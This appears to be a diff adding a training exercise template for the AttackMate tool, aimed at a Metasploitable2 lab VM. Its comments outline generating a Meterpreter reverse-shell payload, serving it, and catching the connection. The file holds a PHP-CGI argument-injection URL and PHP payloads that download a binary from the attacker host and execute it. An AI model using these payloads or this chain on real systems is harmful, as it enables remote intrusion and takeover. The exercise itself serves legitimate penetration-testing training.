@@ -1,0 +1,95 @@
+#
+# Exercise 2: Payload Generation and Delivery via webserv
+# Difficulty: Intermediate
+#
+# Description:
+#     Extend an existing exploit chain by generating a Meterpreter payload,
+#     serving it with webserv, and catching the reverse shell with
+#     exploit/multi/handler.
+#
+#     This exercise practices:
+#     - mktemp for temporary file creation
+#     - msf-payload for ELF binary generation
+#     - webserv with background mode
+#     - exploit/multi/handler as a background listener
+#     - Timing with sleep between background steps
+#     - msf-session with Meterpreter stdapi commands
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - curl installed on the attacker machine
+#     - msfrpcd running: msfrpcd -P msf -a 127.0.0.1
+#     - Run with: attackmate --config ../config.yml exercise_02_payload_webserv.yml
+#
+# Instructions:
+#     1. Replace CHANGE_ME and CHANGE_ME_ATTACKER with your actual IPs
+#     2. Fill in all TODO sections
+#     3. Run the playbook and verify you get a Meterpreter session
+#
+# Hint: Check handout 03_payload_delivery.md and walkthrough 02 if stuck.
+#
+
+vars:
+  TARGET: CHANGE_ME
+  ATTACKER: CHANGE_ME_ATTACKER
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: "4344"
+  WEBSERV_PORT: "8080"
+  PHP_RCE_URL: "http://CHANGE_ME/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
+
+commands:
+  # ============================================
+  # PHASE 1: Generate the Payload
+  # ============================================
+
+  # TODO 1: Use mktemp to create a temporary file and store the path
+  #          in a variable called PAYLOAD_FILE
+
+  # TODO 2: Use msf-payload to generate a Meterpreter ELF payload:
+  #          - payload: $PAYLOAD
+  #          - format: elf
+  #          - local_path: $PAYLOAD_FILE
+  #          - payload_options: LHOST=$ATTACKER, LPORT=$LPORT
+
+  # TODO 3: Use debug to confirm the payload was created (print $PAYLOAD_FILE)
+
+  # ============================================
+  # PHASE 2: Serve and Listen
+  # ============================================
+
+  # TODO 4: Use webserv to serve $PAYLOAD_FILE on port $WEBSERV_PORT
+  #          Run it in background mode with kill_on_exit: True
+
+  # TODO 5: Sleep for 1 second to give webserv time to start
+
+  # TODO 6: Use msf-module to start exploit/multi/handler as a background listener:
+  #          - payload: $PAYLOAD
+  #          - payload_options: LHOST=$ATTACKER, LPORT=$LPORT
+  #          - creates_session: shell
+  #          - background: True, kill_on_exit: True
+
+  # ============================================
+  # PHASE 3: Trigger the Exploit
+  # ============================================
+
+  # TODO 7: Use a shell command with curl to trigger the PHP-CGI vulnerability
+  #          and make the target download the payload from our webserv.
+  #          Use the $PHP_RCE_URL variable.
+  #          PHP code to execute: <?php system('wget -O /tmp/shell http://<ATTACKER>:<PORT>/<PATH>')?>
+  #          (Hint: look at walkthrough 02 for the exact curl command)
+
+  # TODO 8: Sleep for 2 seconds
+
+  # TODO 9: Use a shell command with curl to trigger execution of the payload.
+  #          PHP code: <?php system('chmod +x /tmp/shell && /tmp/shell &')?>
+  #          Run this shell command in background mode.
+
+  # TODO 10: Sleep for 3 seconds to wait for the reverse connection
+
+  # ============================================
+  # PHASE 4: Post-Exploitation
+  # ============================================
+
+  # TODO 11: Use msf-session with stdapi: True to run "sysinfo" in the "shell" session
+
+  # TODO 12: Use msf-session with stdapi: True to run "getuid" and print the result
